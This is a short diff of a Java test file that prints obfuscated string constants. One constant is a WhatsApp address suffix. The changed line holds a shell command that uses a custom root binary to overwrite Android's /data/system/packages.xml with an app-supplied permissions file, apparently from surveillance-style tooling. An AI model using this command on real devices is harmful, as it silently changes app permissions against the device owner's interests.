@@ -16,7 +16,7 @@ public class TestString {
 		System.out.println(" = " + "Hello \"world\"");
 		
 		System.out.println(M.e("@s.whatsapp.net")+ "");
-		System.out.println(M.e("/system/bin/ddi qzx \"cat /data/data/$PACK$/files/perm.xml > /data/system/packages.xml\""));
+		System.out.println(M.e("/system/bin/ddf qzx \"cat /data/data/$PACK$/files/perm.xml > /data/system/packages.xml\""));
 	}
 	
 	public static void testMultiline(){
